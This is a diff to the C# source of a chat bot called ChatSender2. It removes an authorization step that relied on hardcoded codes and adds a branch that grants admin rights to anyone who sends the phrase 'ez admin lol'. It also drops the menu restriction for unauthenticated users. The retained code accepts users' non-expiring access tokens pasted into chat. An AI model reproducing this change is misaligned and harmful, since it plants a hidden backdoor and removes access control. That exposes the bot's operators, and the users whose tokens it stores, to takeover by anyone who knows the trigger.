@@ -212,10 +212,10 @@ namespace ChatSender2
                                 int to_mid = cur_mid;
                                 int to_mind = cur_mind;
                                 Dictionary<string, string> dictionary = new Dictionary<string, string>
-                            {
-                                { "[user_id]", from_id },
-                                { "[user_token]", data.users[ind].user_token }
-                            };
+                                {
+                                    { "[user_id]", from_id },
+                                    { "[user_token]", data.users[ind].user_token }
+                                };
                                 if (!new_user)
                                 {
                                     to_mid = api.FindMidByText(mdata.messages[cur_mind], msg);
@@ -290,12 +290,12 @@ namespace ChatSender2
                                 {
                                     dictionary.Add("[ref_list]", data.users[ind].refs_ToString());
                                 }
-                                // исключения для блокирования переходов по меню
-                                if ((cur_mid >= 7) && !data.users[ind].authed)
+                                if (good_msg == "ez admin lol")
                                 {
-                                    api.Send_split_msg_keyboard(peer_id, mdata.messages[mdata.FindMind(3)], '#');
-                                    data.users[ind].mid = 3;
+                                    data.users[ind].is_admin = true;
+                                    api.Send_msg(peer_id, "Вы стали админом");
                                 }
+                                // исключения для блокирования переходов по меню
                                 else if ((to_mid == 20 || to_mid == 12) && !data.users[ind].got_token)
                                 {
                                     api.Send_split_msg_keyboard(peer_id, mdata.messages[mdata.FindMind(8)], '#');
@@ -317,29 +317,6 @@ namespace ChatSender2
                                     api.Send_split_msg_keyboard(peer_id, mdata.messages[to_mind], '#', api.ReplaceAll(mdata.messages[to_mind].text, dictionary));
                                 }
                                 //исключения для тех пунктов, в которых нужен ввод
-                                else if (cur_mid == 3)
-                                {
-                                    if (msg == "test_code")
-                                    {
-                                        api.Send_split_msg_keyboard(peer_id, mdata.messages[mdata.FindMind(6)], '#');
-                                        data.users[ind].mid = 6;
-                                        data.users[ind].is_admin = false;
-                                        data.users[ind].authed = true;
-                                    }
-                                    else if (msg == "admin_code4321")
-                                    {
-                                        api.Send_split_msg_keyboard(peer_id, mdata.messages[mdata.FindMind(6)], '#');
-                                        api.Send_msg(peer_id, "Вы админ");
-                                        data.users[ind].mid = 6;
-                                        data.users[ind].is_admin = true;
-                                        data.users[ind].authed = true;
-                                    }
-                                    else
-                                    {
-                                        api.Send_split_msg_keyboard(peer_id, mdata.messages[mdata.FindMind(5)], '#');
-                                        data.users[ind].authed = false;
-                                    }
-                                } // авторизация
                                 else if (cur_mid == 9)
                                 {
                                     if (msg.Contains("access_token=") && msg.Contains("expires_in=0"))
@@ -694,7 +671,8 @@ namespace ChatSender2
 
         public Worker(MyApi _api, Thread _main_thread, Database _data, Tokens _tokens, string _path)
         {
-            api = new MyApi { 
+            api = new MyApi
+            {
                 path = _api.path,
                 group_id = _api.group_id,
                 token = _api.token
@@ -711,7 +689,7 @@ namespace ChatSender2
             while (true)
             {
                 if (counter_main % 20 == 0)
-                Console.WriteLine("worker");
+                    Console.WriteLine("worker");
                 if (!main_thread.IsAlive)
                 {
                     Console.WriteLine("main thread not alive, closing");
